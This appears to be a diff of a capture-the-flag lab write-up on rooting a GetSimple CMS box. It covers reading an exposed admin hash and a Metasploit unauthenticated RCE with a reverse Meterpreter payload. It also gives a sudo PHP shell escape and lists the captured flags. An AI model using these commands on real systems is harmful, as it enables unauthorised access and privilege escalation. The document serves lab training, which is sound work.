@@ -1,138 +1,97 @@
-# 🏁 Lab: GetSimple CMS (Module 2 Completion)
-
-**Target IP:** `10.129.46.76`
-
-**Date:** 2026-04-05
-
-**User Path:** GetSimple CMS Unauthenticated RCE
-
-**PrivEsc Path:** PHP Sudo Escape (GTFOBins)
-
-**Status:** **Success / Rooted** ✅
+**Date:** 2026-04-05 
+**Category:** #CMS_Exploitation / #Information_Leakage / #GTFOBins 
+**Target IP:** `10.129.46.76` 
+**Status:** **Rooted ✅**
 
 ---
 
-## 🛠️ Execution Flow
+## 🔍 Phase 1: External Enumeration
 
-### 1. External Enumeration & Reconnaissance
+> **Objective:** Map the web application structure and identify sensitive data exposure.
 
-- **Action:** Fast Port Scanning.
-    
-    - `nmap -p- --min-rate 5000 10.129.46.76`
-        
-    - **Result:** Open ports **22 (SSH)** and **80 (HTTP)**.
-        
-- **Action:** Web Technology Profiling.
-    
-    - `whatweb 10.129.46.76`
-        
-    - **Findings:** Running **Apache 2.4.41** on **Ubuntu Linux**. Title: "Welcome to GetSimple!".
-        
-- **Action:** Directory Brute-forcing.
-    
-    - `gobuster dir -u http://10.129.46.76 -w /usr/share/seclists/Discovery/Web-Content/common.txt`
-        
-    - **Interesting Paths:**
-        
-        - `/admin/` (Login Portal)
-            
-        - `/data/` (Sensitive Directory)
-            
-        - `/backups/`
-            
-        - `/robots.txt` (Confirmed `/admin/` is disallowed).
-            
+### 🛠️ Execution & Intelligence
 
-### 2. Information Leakage & Credential Access
-
-- **Action:** Sensitive Data Extraction.
+1. **Service Discovery:** `nmap -p- --min-rate 5000 10.129.46.76`
     
-    - Navigated to `http://10.129.46.76/data/users/admin.xml`.
+    - **Result:** Port 22 (SSH) and 80 (HTTP) open.
         
-    - **Discovery:** Found the admin user’s SHA1 password hash: `d033e22ae348aeb5660fc2140aec35850c4da997`.
-        
-- **Action:** Hash Decryption.
+2. **Web Profiling:** `whatweb 10.129.46.76` identified **GetSimple CMS**.
     
-    - Type: **SHA1**.
-        
-    - **Result:** Decrypted to **"admin"**.
-        
-- **Action:** Authentication.
+3. **Directory Fuzzing:** `gobuster` identified several sensitive directories:
     
-    - Successfully logged into the admin panel at `/admin/` using `admin:admin`.
+    - `/admin/` (Management portal)
         
-    - **CMS Version:** Identified **GetSimple CMS - Version 3.3.15** in the footer.
+    - `/data/` (Application data - **Directory Listing Enabled**)
         
 
-### 3. Exploitation (Initial Foothold)
+---
 
-- **Action:** Vulnerability Research.
+## 🔑 Phase 2: Information Leakage & Auth
+
+> **Objective:** Bypass authentication by leveraging exposed configuration files.
+
+1. **The Leak:** Navigated to `http://10.129.46.76/data/users/admin.xml`.
     
-    - Identified **Exploit-DB** entry: _GetSimpleCMS - Unauthenticated Remote Code Execution (Metasploit)_.
-        
-- **Action:** Metasploit Execution.
+2. **The Hash:** Extracted the SHA1 hash for the `admin` user: `d033e22ae348aeb566...`
     
-    1. `msfconsole`
-        
-    2. `use exploit/multi/http/getsimplecms_unauth_code_exec`
-        
-    3. `set RHOSTS 10.129.46.76`
-        
-    4. `set LHOST 10.10.14.75`
-        
-    5. `check` -> **Result:** "The target is vulnerable."
-        
-    6. `exploit`
-        
-- **Action:** Post-Exploitation TTY.
+3. **Cracking:** The hash decrypted to the weak password `admin`.
     
-    - Established **Meterpreter** session.
-        
-    - Entered `shell` to access the Linux command line.
-        
-- **Flag 1:** Captured from `/home/mrb3n/user.txt`.
-    
-- **🚩 Flag:** `7002d65b149b0a4d19132a66feed21d8`
+4. **Access:** Authenticated to the CMS dashboard. **Version identified: 3.3.15.**
     
 
-### 4. Privilege Escalation (Vertical)
+---
 
-- **Action:** Sudo Permission Check.
+## 🐚 Phase 3: Initial Foothold (Meterpreter)
+
+> **Objective:** Utilize a known RCE vulnerability to gain an interactive OS shell.
+
+### 🛠️ Metasploit Execution
+
+1. **Module:** `exploit/multi/http/getsimplecms_unauth_code_exec`
     
-    - `sudo -l`
-        
-    - **Result:** `(ALL : ALL) NOPASSWD: /usr/bin/php`.
-        
-- **Action:** GTFOBins Research.
+2. **Payload:** `linux/x86/meterpreter/reverse_tcp`
     
-    - Researched PHP Sudo escape sequences at [gtfobins.github.io](https://www.google.com/search?q=https://gtfobins.github.io/gtfobins/php/%23sudo).
-        
-- **Action:** Root Escape.
+3. **Flag Recovery:** * **User:** `mrb3n`
     
-    - **Command:** `sudo /usr/bin/php -r 'system("/bin/sh -i");'`
+    - **🚩 User Flag:** `7002d65b149b0a4d19132a66feed21d8`
         
-- **Verification:** `whoami` -> **root**.
+
+---
+
+## 🪜 Phase 4: Vertical Privilege Escalation
+
+> **Objective:** Escalate from `mrb3n` to `root` using binary misconfigurations.
+
+### 🔍 Sudo Enumeration
+
+The command `sudo -l` revealed a critical security hole:
+
+- **Entry:** `(ALL : ALL) NOPASSWD: /usr/bin/php`
     
 
-### 5. Final Root Access
+### 🛠️ The PHP Escape (GTFOBins)
 
-- **Action:** Flag Retrieval.
+Since PHP can execute system commands, running it with `sudo` allows for an immediate root shell:
+
+Bash
+
+```
+sudo /usr/bin/php -r 'system("/bin/sh -i");'
+```
+
+### 🏁 Final Root Access
+
+- **Verification:** `whoami` -> `root`
     
-    - `cd /root`
-        
-    - `cat root.txt`
-        
-- **Flag 2:** Captured from `/root/root.txt`.
-    
-- **🚩 Flag:** `f1fba6e9f71efb2630e6e34da6387842`
+- **🚩 Root Flag:** `f1fba6e9f71efb2630e6e34da6387842`
     
 
 ---
 
 ## 🧠 Lessons Learned
 
-1. **Directory Listing/Information Leakage:** Even if a login page exists, check directories like `/data/` or `/users/`. XML files often store password hashes that can be easily cracked if using weak algorithms like SHA1.
+- **Directory Listing:** Never ignore `/data/` or `/backup/` folders. Even if a login page is secure, the backend data storage might leak the keys to the kingdom.
     
-2. **Unauthenticated RCE:** Certain CMS versions allow code execution even before logging in if the exploit leverages specific plugin vulnerabilities.
+- **Unauthenticated RCE:** Certain exploits can trigger before login. Always check **Exploit-DB** for the specific CMS version before spending time on brute-forcing.
     
-3. **GTFOBins Power:** If `sudo -l` reveals a programming language like **PHP, Python, or Ruby**, you have an almost guaranteed path to root via the `system()` or `exec()` functions.
+- **GTFOBins Power:** If `sudo -l` shows a programming language (PHP, Python, Perl), the system is effectively compromised. These binaries have built-in "Escape" functions that bypass the restricted shell.
